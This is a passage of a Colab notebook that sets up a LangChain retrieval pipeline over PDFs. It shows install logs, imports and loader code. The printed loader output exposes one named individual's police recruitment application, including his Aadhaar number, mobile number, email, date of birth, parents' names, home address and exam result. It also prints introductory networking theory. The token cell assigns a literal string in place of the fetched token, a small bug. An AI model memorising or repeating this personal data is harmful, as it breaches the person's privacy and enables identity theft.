            "\u001b[?25hDownloading opentelemetry_exporter_otlp_proto_grpc-1.27.0-py3-none-any.whl (18 kB)\n",
            "Downloading opentelemetry_exporter_otlp_proto_common-1.27.0-py3-none-any.whl (17 kB)\n",
            "Downloading opentelemetry_proto-1.27.0-py3-none-any.whl (52 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m52.5/52.5 kB\u001b[0m \u001b[31m5.2 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading opentelemetry_instrumentation_fastapi-0.48b0-py3-none-any.whl (11 kB)\n",
            "Downloading opentelemetry_instrumentation-0.48b0-py3-none-any.whl (29 kB)\n",
            "Downloading opentelemetry_instrumentation_asgi-0.48b0-py3-none-any.whl (15 kB)\n",
            "Downloading opentelemetry_semantic_conventions-0.48b0-py3-none-any.whl (149 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m149.7/149.7 kB\u001b[0m \u001b[31m14.8 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading opentelemetry_util_http-0.48b0-py3-none-any.whl (6.9 kB)\n",
            "Downloading opentelemetry_sdk-1.27.0-py3-none-any.whl (110 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m110.5/110.5 kB\u001b[0m \u001b[31m11.6 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading orjson-3.10.7-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (141 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m141.9/141.9 kB\u001b[0m \u001b[31m15.0 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading overrides-7.7.0-py3-none-any.whl (17 kB)\n",
            "Downloading posthog-3.6.6-py2.py3-none-any.whl (54 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m54.3/54.3 kB\u001b[0m \u001b[31m5.5 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading pydantic_settings-2.5.2-py3-none-any.whl (26 kB)\n",
            "Downloading tenacity-8.5.0-py3-none-any.whl (28 kB)\n",
            "Downloading uvicorn-0.30.6-py3-none-any.whl (62 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m62.8/62.8 kB\u001b[0m \u001b[31m6.6 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading backoff-2.2.1-py3-none-any.whl (15 kB)\n",
            "Downloading Deprecated-1.2.14-py2.py3-none-any.whl (9.6 kB)\n",
            "Downloading h11-0.14.0-py3-none-any.whl (58 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m58.3/58.3 kB\u001b[0m \u001b[31m6.3 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading httptools-0.6.1-cp310-cp310-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (341 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m341.4/341.4 kB\u001b[0m \u001b[31m28.5 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading importlib_metadata-8.4.0-py3-none-any.whl (26 kB)\n",
            "Downloading jsonpatch-1.33-py2.py3-none-any.whl (12 kB)\n",
            "Downloading marshmallow-3.22.0-py3-none-any.whl (49 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m49.3/49.3 kB\u001b[0m \u001b[31m4.5 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading monotonic-1.6-py2.py3-none-any.whl (8.2 kB)\n",
            "Downloading python_dotenv-1.0.1-py3-none-any.whl (19 kB)\n",
            "Downloading starlette-0.38.5-py3-none-any.whl (71 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m71.4/71.4 kB\u001b[0m \u001b[31m7.1 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading typing_inspect-0.9.0-py3-none-any.whl (8.8 kB)\n",
            "Downloading uvloop-0.20.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (3.4 MB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m3.4/3.4 MB\u001b[0m \u001b[31m33.5 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading watchfiles-0.24.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (425 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m425.7/425.7 kB\u001b[0m \u001b[31m37.4 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading websockets-13.0.1-cp310-cp310-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (157 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m157.3/157.3 kB\u001b[0m \u001b[31m16.7 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading coloredlogs-15.0.1-py2.py3-none-any.whl (46 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m46.0/46.0 kB\u001b[0m \u001b[31m5.0 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading asgiref-3.8.1-py3-none-any.whl (23 kB)\n",
            "Downloading humanfriendly-10.0-py2.py3-none-any.whl (86 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m86.8/86.8 kB\u001b[0m \u001b[31m9.1 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading jsonpointer-3.0.0-py2.py3-none-any.whl (7.6 kB)\n",
            "Downloading mypy_extensions-1.0.0-py3-none-any.whl (4.7 kB)\n",
            "Building wheels for collected packages: llama-cpp-python, pypika\n",
            "  Building wheel for llama-cpp-python (pyproject.toml) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for llama-cpp-python: filename=llama_cpp_python-0.2.90-cp310-cp310-linux_x86_64.whl size=3414598 sha256=8bee9433ddbe023068cbc7b05f3c68ea08f973c06c92dc844105c9835e367f1f\n",
            "  Stored in directory: /root/.cache/pip/wheels/3d/67/02/f950031435db4a5a02e6269f6adb6703bf1631c3616380f3c6\n",
            "  Building wheel for pypika (pyproject.toml) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for pypika: filename=PyPika-0.48.9-py2.py3-none-any.whl size=53723 sha256=fb4ddedddbb42e06220b45e36363d1e35865e53abbe7029c7b1a5724527c9b4c\n",
            "  Stored in directory: /root/.cache/pip/wheels/e1/26/51/d0bffb3d2fd82256676d7ad3003faea3bd6dddc9577af665f4\n",
            "Successfully built llama-cpp-python pypika\n",
            "Installing collected packages: pypika, monotonic, mmh3, websockets, uvloop, tenacity, python-dotenv, pypdf, overrides, orjson, opentelemetry-util-http, opentelemetry-proto, mypy-extensions, marshmallow, jsonpointer, importlib-metadata, humanfriendly, httptools, h11, diskcache, deprecated, chroma-hnswlib, bcrypt, backoff, asgiref, watchfiles, uvicorn, typing-inspect, starlette, posthog, opentelemetry-exporter-otlp-proto-common, opentelemetry-api, llama-cpp-python, jsonpatch, httpcore, coloredlogs, pydantic-settings, opentelemetry-semantic-conventions, opentelemetry-instrumentation, onnxruntime, kubernetes, httpx, fastapi, dataclasses-json, opentelemetry-sdk, opentelemetry-instrumentation-asgi, langsmith, sentence-transformers, opentelemetry-instrumentation-fastapi, opentelemetry-exporter-otlp-proto-grpc, langchain-core, langchain-text-splitters, chromadb, langchain, langchain_community\n",
            "  Attempting uninstall: tenacity\n",
            "    Found existing installation: tenacity 9.0.0\n",
            "    Uninstalling tenacity-9.0.0:\n",
            "      Successfully uninstalled tenacity-9.0.0\n",
            "  Attempting uninstall: importlib-metadata\n",
            "    Found existing installation: importlib_metadata 8.5.0\n",
            "    Uninstalling importlib_metadata-8.5.0:\n",
            "      Successfully uninstalled importlib_metadata-8.5.0\n",
            "Successfully installed asgiref-3.8.1 backoff-2.2.1 bcrypt-4.2.0 chroma-hnswlib-0.7.6 chromadb-0.5.5 coloredlogs-15.0.1 dataclasses-json-0.6.7 deprecated-1.2.14 diskcache-5.6.3 fastapi-0.115.0 h11-0.14.0 httpcore-1.0.5 httptools-0.6.1 httpx-0.27.2 humanfriendly-10.0 importlib-metadata-8.4.0 jsonpatch-1.33 jsonpointer-3.0.0 kubernetes-30.1.0 langchain-0.3.0 langchain-core-0.3.1 langchain-text-splitters-0.3.0 langchain_community-0.3.0 langsmith-0.1.121 llama-cpp-python-0.2.90 marshmallow-3.22.0 mmh3-4.1.0 monotonic-1.6 mypy-extensions-1.0.0 onnxruntime-1.19.2 opentelemetry-api-1.27.0 opentelemetry-exporter-otlp-proto-common-1.27.0 opentelemetry-exporter-otlp-proto-grpc-1.27.0 opentelemetry-instrumentation-0.48b0 opentelemetry-instrumentation-asgi-0.48b0 opentelemetry-instrumentation-fastapi-0.48b0 opentelemetry-proto-1.27.0 opentelemetry-sdk-1.27.0 opentelemetry-semantic-conventions-0.48b0 opentelemetry-util-http-0.48b0 orjson-3.10.7 overrides-7.7.0 posthog-3.6.6 pydantic-settings-2.5.2 pypdf-5.0.0 pypika-0.48.9 python-dotenv-1.0.1 sentence-transformers-3.1.0 starlette-0.38.5 tenacity-8.5.0 typing-inspect-0.9.0 uvicorn-0.30.6 uvloop-0.20.0 watchfiles-0.24.0 websockets-13.0.1\n"
          ]
        }
      ],
      "source": [
        "!pip install langchain sentence-transformers chromadb llama-cpp-python langchain_community pypdf"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "4FopYAa6Krjj"
      },
      "source": [
        "## Import libraries"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 2,
      "metadata": {
        "id": "kGXeRCdILsha",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "8073bcc2-0ce6-40d3-9ecc-7cc9e38abf6f"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.10/dist-packages/pydantic/_internal/_fields.py:132: UserWarning: Field \"model_name\" in HuggingFaceInferenceAPIEmbeddings has conflict with protected namespace \"model_\".\n",
            "\n",
            "You may be able to resolve this warning by setting `model_config['protected_namespaces'] = ()`.\n",
            "  warnings.warn(\n"
          ]
        }
      ],
      "source": [
        "from langchain_community.document_loaders import PyPDFDirectoryLoader\n",
        "from langchain.text_splitter import CharacterTextSplitter,RecursiveCharacterTextSplitter\n",
        "from langchain_community.embeddings import HuggingFaceEmbeddings\n",
        "from langchain.vectorstores import FAISS, Chroma\n",
        "from langchain_community.llms import LlamaCpp\n",
        "from langchain.chains import RetrievalQA, LLMChain"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 3,
      "metadata": {
        "id": "0zEnm5dLTd7s"
      },
      "outputs": [],
      "source": [
        "import pathlib\n",
        "import textwrap\n",
        "from IPython.display import display\n",
        "from IPython.display import Markdown\n",
        "\n",
        "\n",
        "\n",
        "def to_markdown(text):\n",
        "  text = text.replace('•', '  *')\n",
        "  return Markdown(textwrap.indent(text, '> ', predicate=lambda _: True))"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 4,
      "metadata": {
        "id": "XXu9elVHUX1G"
      },
      "outputs": [],
      "source": [
        "# Used to securely store your API key\n",
        "from google.colab import userdata"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "DmzD-oWKLtOJ"
      },
      "source": [
        "## Setup HuggingFace Access Token\n",
        "\n",
        "- Log in to [HuggingFace.co](https://huggingface.co/)\n",
        "- Click on your profile icon at the top-right corner, then choose [“Settings.”](https://huggingface.co/settings/)\n",
        "- In the left sidebar, navigate to [“Access Token”](https://huggingface.co/settings/tokens)\n",
        "- Generate a new access token, assigning it the “write” role.\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 6,
      "metadata": {
        "id": "St7dpcL4UiX0"
      },
      "outputs": [],
      "source": [
        "# Or use `os.getenv('HUGGINGFACEHUB_API_TOKEN')` to fetch an environment variable.\n",
        "import os\n",
        "from getpass import getpass\n",
        "\n",
        "HUGGINGFACEHUB_API_TOKEN = userdata.get(\"HUGGINGFACEHUB_API_TOKEN\")\n",
        "os.environ[\"HUGGINGFACEHUB_API_TOKEN\"] = \"HUGGINGFACEHUB_API_TOKEN\""
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "KFyNhHmsMYBC"
      },
      "source": [
        "## Import document"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 7,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Z2O4acnZmg66",
        "outputId": "cabefb28-8710-4a0c-ed0f-9957f4628dc8"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Mounted at /content/drive\n"
          ]
        }
      ],
      "source": [
        "#connect to google drive\n",
        "from google.colab import drive\n",
        "drive.mount('/content/drive') #Fixed typo in directory name"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 8,
      "metadata": {
        "id": "bOrnY8dgMdxt"
      },
      "outputs": [],
      "source": [
        "loader = PyPDFDirectoryLoader(\"/content/drive/MyDrive/Pdf\")\n",
        "docs = loader.load()"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 9,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "K1TTrH5QNQxa",
        "outputId": "f6045117-60f8-4d9d-e020-638ea05e3706"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216.pdf', 'page': 0}, page_content=\"1.\\nName (As per SSC / Equivalent certificate)\\n:\\nSUNNAM SEETHARAM\\n2.\\nFather's/ Husband's Name\\n:\\nS VEERRAJU\\nPreserve the REGISTRATION NUMBER \\nfor all your future correspondence.\\n3.\\nMother's Name\\n:\\nS SUBHADRA\\n4.\\nGender\\n:\\nMale\\n5.\\nDate of Birth\\n(As per SSC/Equivalent certificate)\\n:\\n16-08-1996\\n4159216\\n6.\\n(a) SSC/Equivalent Roll No.\\n:\\n1111127157\\n(b) Year of Passing\\n:\\n2011\\n11.\\n7.\\nUpload Certificate (SSC or Equivalent)\\n:\\nUploaded\\n8.\\nEducational Qualification\\n:\\nIntermediate  / Any other \\nequivalent\\n9.\\nCommunity\\n:\\nABO-ST\\n10.\\nUpload Community Certificate\\n(For BC, SC and ST)\\n:\\nUploaded\\n13.\\nDo you belong to EWS Category ?\\n:\\nNo\\n14.\\nUpload EWS Certificate\\n(For OC)\\n:\\n---\\n15.\\nDo you belong to Ex-Servicemen ?\\n:\\nNo\\nEx-Servicemen Joining Date\\n:\\n---\\nEx-Servicemen Discharge Date / Likely Date \\nof Discharge\\n:\\n---\\n16.\\nldentificaton Marks\\n(As per SSC / Equivalent certificate)\\n:\\nA MOLE ON THE LEFT SIDE OF \\nTHE CHEST\\n:\\nA MOLE ON THE RIGHT SIDE OF \\nTHE RIBBS\\n17.\\nMobile No.\\n:\\n8688655324\\n12.\\n18.\\nE-mail id\\n:\\nbtgsuryacomputers@gmail.c\\nom\\n19.\\n(a) Do you have Aadhaar Card ?\\n:\\nYes\\n(b) lf yes, please mention number\\n:\\n673915750575\\n20.\\nWhat is your preferred medium\\nof Examination ?\\n:\\nTelugu\\n21.\\nWhich is your prefered place for \\nwriting Preliminary written test ?\\n(SLPRB, AP reserves the Right to \\ninclude New Test Centres, if \\nnecessary)\\n1st\\n:\\nRAJAMAHENDRAVARAM\\n2nd\\n:\\nELURU\\n3rd\\n:\\nTADEPALLIGUDEM\\n22.\\nPost Preferences as per notification\\n1st\\n:\\n21 - SCT PC (Civil) (Men & \\nWomen)\\n2nd\\n:\\n23 - SCT PC (APSP) (Men)\\n23.\\nWhich is your preferred place for \\nappearing in PMT / PET after you \\nhave qualified in Preliminary written \\nExamination ?\\n1st\\n:\\nEast Godavari\\n2nd\\n:\\nWest Godavari\\n24.\\nAre you a Local of State of Andhra \\nPradesh ?\\n:\\nYes\\na) lf yes, which is your Local District ? \\n:\\nWest Godavari\\nb) lf No, which State/UT you belong to ?\\n:\\n---\\n25.\\nAre you claiming benefit of age relaxation ? \\n(Please go through the Notificaiton) \\n:\\nNo\\nIf yes, Please specify the applicable \\ncategory.\\na) BC\\n:  No\\nb) SC\\n:  No\\nc) ST/ABOST\\n:  No\\nd) AP Government Employee\\n:  No\\ne) Ex-Servicemen\\n:  No\\nf) NCC Instructor\\n:  No\\ng) AP State Census Department \\n:  No\\nh) Andhra Pradesh Home Guard\\n:  No\\ni) Widow / Divorced / Judicially             \\n   Separated Women                                                               \\n:  No\\nj) EWS Category\\n:  No\\n26.\\nAs per Rule 3 (G) of GO Ms. No. 97 dated 01.05.2006 and amendments there on, and as mentioned in Notification at Para No. 27, \\nthe candidates falling under certain categories shall be disqualified for recruitment. (Please go through the Notification)\\nDo you come under those \\ncategories ?\\nIf yes, please note that you are not \\neligible for recruitment.\\n:\\nNo\\n27.\\nAddress for Communication\\n:  PEDA JEEDIPUDI VILLAGE DORAMAMIDI POST, BUTTAYA GUDEM \\nMANDAL, West Godavari, BUTTAYA GUDEM, 534448\\n28.\\nFee Paid through : Payment Gateway\\nTransaction Id : YUTI1614269839\\nFee : 150\\nCertified \\nthat \\nI \\nhave \\nread, \\nunderstood \\nand \\naccept \\nall \\nthe \\nTerms \\nand \\nconditions \\nof \\nthe \\nNotification. \\nI \\nundertake \\nComplete \\nresponsibility \\nthat \\nI \\nhave\\nsubmitted \\ncorrect \\ninformation \\nto \\nthe \\nbest \\nof \\nmy \\nknowledge \\nand \\nbelief.\\nNote: \\nPlease \\ndownload \\nHall \\nTicket \\nto \\nhave \\naccess \\nto \\nthe \\nExamination \\nCentre. \\nThe \\nHall \\nTickets \\nwill \\nbe \\navailable \\nfor \\ndownload \\nfrom \\nthe \\nwebsite \\n14\\ndays \\nprior \\nto \\nthe \\nDate \\nof \\nExamination.\\nSTATE LEVEL POLICE RECRUITMENT BOARD, ANDHRA PRADESH\\nSTAGE I ONLINE APPLICATION FORM\\nONLINE APPLICATION FORM FOR THE POSTS OF SCT PC (CIVIL) (MEN & WOMEN): POST CODE NO. 21, \\n     SCT PC (APSP) (MEN): POST CODE NO. 23,\\nVIDE NOTIFICATION RC.NO. 161/SLPRB/RECT.2/2022, DT. 28.11.2022\\n\"),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216.pdf', 'page': 1}, page_content='Date : 07-02-2023 14:40:21\\nSTATE LEVEL POLICE RECRUITMENT BOARD, ANDHRA PRADESH\\nSTAGE I ONLINE APPLICATION FORM\\nONLINE APPLICATION FORM FOR THE POSTS OF SCT PC (CIVIL) (MEN & WOMEN): POST CODE NO. 21, \\n     SCT PC (APSP) (MEN): POST CODE NO. 23,\\nVIDE NOTIFICATION RC.NO. 161/SLPRB/RECT.2/2022, DT. 28.11.2022\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/https___slprb.ap.gov.in_UI_PCResults (2).pdf', 'page': 0}, page_content='RESUL T \\nSCT PC (Civil) (Men& W omen) and SCT PC (APSP) (Men) in Police Department, \\nvide Notiﬁcation Rc. No. 161/SLPRB/ Rect.2/2022, Dtd: 28.11.2022\\nPreliminary Written T est (PWT) Date: 22.01.2023\\n\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0 Enter\\nRegistr ation Number:4 1 5 9 2 1 6   \\nEnter PWT Hall Tick et Number : 5 5 6 1 2 9 0 3 8 4  \\nGener ate New Image\\nType the code from\\nthe image\\n \\nSubmit\\n\\xa0\\xa0 \\xa0\\xa0\\nRegistr ation Number 4159216\\nName of the Candidate SUNNAM SEETHARAM\\nGender Male\\nMarks in PWT 66\\nResult for PWT Qualiﬁed\\nDownload another Result  Print\\nDownload cop y of OMR shee'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/IMG_20231011_110129.pdf', 'page': 0}, page_content=''),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/0.Network-Basics-Theory-1.pdf', 'page': 0}, page_content='Theory\\nHacking with \\nNetwork Basics'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/0.Network-Basics-Theory-1.pdf', 'page': 1}, page_content=\" \\n A network is a group of two or more  computer systems or other devices \\nthat are linked together to exchange data . In networks, computing devices \\nexchange data with each other using data links between nodes. These data links \\nare established with the help of cable media such as wires or wireless media \\nsuch as WiFi.  \\n \\nNetwork Components and Functions  \\nServer : A computer or device on a network that manages  network \\nresources. Servers are often dedicated , meaning that they perform no other tasks \\nbesides their server tasks like accepts and responds to requests made by another \\nprogram, known as a client.  \\nClient : A client is an application that runs on a personal computer or \\nworkstation and relies on a serve r to perform some operations. The client \\naccesses the server by way of a network.  \\nDevices : Computer devices, such as a CD -ROM drive or printer, that is \\nnot part of the essential computer. Examples of devices include disk drives, \\nprinters, and modems.  \\nHub : Hub is a network hardware device for connecting multiple devices \\nand making them act as a single network segment. A hub works at the physical \\nlayer of the OSI model.  \\nSwitch : A device that filters and forwards packets between LAN \\nsegments. Switches  operate at the data link layer and  sometimes the network \\nlayer of the OSI Reference Model.  \\nRouter : A router is a device that  is capable of forwarding data packets on \\na network . Routers are placed  at the junction  (gateway)  of two or more \\nnetworks connect . Routers use headers and forwarding tables to determine the \\nbest path for forwarding the packets.  \\n  Bridge : Bridge is a computer networking device that connects a local \\narea network (LAN) to another local area network tha t uses the same protocol.  \\nAccess Point : A hardware device or a computer's software that acts as a \\ncommunication hub for users to connect all their wireless device.  \\n \\nTypes of Networks  \\n \\nLocal area network (LAN)  \\nA LAN is a network that connects computers  and devices in a limited \\ngeographical area such as a home, school, office building.  \\nWide area network (WAN)  \\nA WAN  is a computer network that covers a large geographic area such \\nas a city, country, or spans even inter continental distances. A WAN uses a \\ncommunications channel that combines many types of media such as telephone \\nlines,  ethernet cables, optical fibers , etc. \"),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/0.Network-Basics-Theory-1.pdf', 'page': 2}, page_content=' \\n Metropolitan Area Networks (MAN)   \\nMetropolitan area Network covers a larger area than that of a LAN a nd \\nsmaller area  when compared to WAN. MANs rarely extend beyond 100 KM \\nand comprise a combination of different hardware and transmission media.  \\nWireless Local Area Network (WLAN)  \\nWireless local area networks provide wireless network communication \\nover shor t distances using radio or infrared signals instead of traditional \\nnetwork cabling. WLAN s are built by attaching a device called the access point  \\nto the edge of the wired network. Clients communicate with the AP using a \\nwireless network adapter similar in f unction to a traditional Ethernet adapter.  \\nVirtual private network (VPN)  \\nThe v irtual  private network is an overlay network in which some of the \\nlinks between nodes are carried by virtual circuits  in the network  instead of \\nphysical wires. The data link layer proto cols of the virtual network are said to \\nbe tunneled through  the network .   \\nPersonal Area Network (PAN)  \\nA personal area network is a computer network organized around an \\nindividual . Personal  area networks typically involve  mobile devices. Personal \\narea networks can be wired or wirelessly.  These networks gen erally cover a \\nnetwork range of 10 meters (about 30 feet).  \\n \\nOSI model  \\nOSI (Open Systems Interconnection) is a reference model for how \\napplications communicate over a networ k. The main concept of OSI is that the \\nprocess of communication between two endpoints in a network can be divided  \\ninto seven distinct groups of related functions  or layers. Each communicating \\nuser or program is on a device that can provide those seven lay ers of function.  \\nThe seven Open Systems Interconnection layers are:  \\n \\n \\n \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/0.Network-Basics-Theory-1.pdf', 'page': 3}, page_content=' \\n Layer 1: Physical Layer  \\nThis layer conveys the bit stream across the network either electrically, \\nmechanically or through radio waves. The physical layer covers a variety of \\ndevices an d mediums, among them cabling, connectors, receivers, transceivers , \\nand repeaters.  \\nLayer 2: Data Link Layer  \\nThis layer sets up links across the physical network, putting packets into \\nnetwork frames. This layer has two sublayers the logical link control lay er and \\nthe media access control layer (MAC). MAC layer types include Ethernet and \\n802.11 wireless specifications.  \\nLayer 3: Network Layer  \\nThis layer handles addressing and routing the data. To transfer it from the \\nright source to the right destination. The IP address is part of the network  layer.  \\nLayer 4: Transport Layer  \\nThis layer manages packetization of data, then the delivery of the packets, \\nincluding checking for errors in the data once it arrives. On the internet, TCP \\nand UDP provide these services for most a pplications.  \\nLayer 5: Session Layer  \\nThe session layer controls the connections between computers. It \\nestablishes, manages and terminates the connections between the local and \\nremote application.  \\nLayer 6: Presentation Layer  \\nThis layer is usually part of an  operating system (OS) and converts \\nincoming and outgoing data from one presentation format to another for \\nexample, from clear text to encrypted text at one end and back to clear text at \\nthe other.  \\nLayer 7: Application Layer  \\nThe application layer of the OSI model interacts with the end user. \\nProtocols at this layer handle  the requests from different software applications. \\nIf a web browser wants to download an image, an email client wants to check \\nthe server , and a file -sharing program wants  to upload a movie, t he protocols in \\nthe application layer will process those requests.  \\n \\nIP address  \\nAn Internet Protocol address (IP address) is a numerical label assigned to \\neach device connected to a computer network. IP addres s serves two purposes , \\nhost or networ k interface identification and location addressing. Internet \\nProtocol version 4 (IPv4) defines an IP address as a 32 -bit number  and new \\nversion of IP (IPv6), uses 128 bits for the IP address.  \\nPrivate IP address : A private IP address is a non -Internet facin g IP address. \\nPrivate IP addresses are provided by network devices, such as routers, using \\nnetwork address translation (NAT).  '),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/0.Network-Basics-Theory-1.pdf', 'page': 4}, page_content=' \\n Public IP address:  A public IP address is an IP address that can be accessed  \\nover the Internet. The p ublic  IP address is a globally  unique IP address assigned \\nto a computing device.  \\n \\nIPv4: Internet Protocol Version 4 is the fourth revision of the Internet Protocol \\nused to identify devices on a network. IPv4 is the most widely deployed Internet \\nprotocol used to connect devices to the Inter net. IPv4 uses a 32 -bit address \\nscheme allowing  a total of 2^32 addresses.  \\n \\nIPv6: Internet Protocol Version 6 is the newest version of the Internet Protocol  \\nreviewed in the IETF standards committees to replace the current version of \\nIPv4. IPv6 addresses are 128 -bit IP address written in hexadecimal and \\nseparated by colons. An example IPv6 address could be written like this 3 ffe: \\n1900:4545:3 :200: f 8ff: fe 21:67cf.  \\n \\nIP address classes  \\nThere are five classes of  IP addresse s, they are  Class A, Class B, Class C, Class \\nD and Class E,  where only A, B, and C are commonly used.  \\n \\nClass  Address Range  Supports  \\nClass A  1.0.0.1 to \\n126.255.255.254  Supports 16 million hosts on each \\nof 127 networks.  \\nClass B  128.1.0.1 to \\n191.255.255.254  Supports 65,000 hosts on each of \\n16,000 networks.  \\nClass C  192.0.1.1 to \\n223.255.254.254  Supports 254 hosts on each of 2 \\nmillion networks.  \\nClass D  224.0.0.0 to \\n239.255.255.255  Reserved for multicast groups.  \\nClass E  240.0.0.0 to \\n254.255.255.254  Reserved for future use, or Research \\nand Development Purposes.  \\n \\nSubnetwork (Subnet)    \\nA subnet is a logical subdivision of an IP network.  Dividing a network \\ninto two or more networks is known as subnetting. Computers that belong to a \\nsubnet are addressed with a significant bit -group in their IP addresses. \\nSubnetting  results in the logical division of  an IP address into two parts, the \\nnetwork address , and the host identifier.  '),\n",
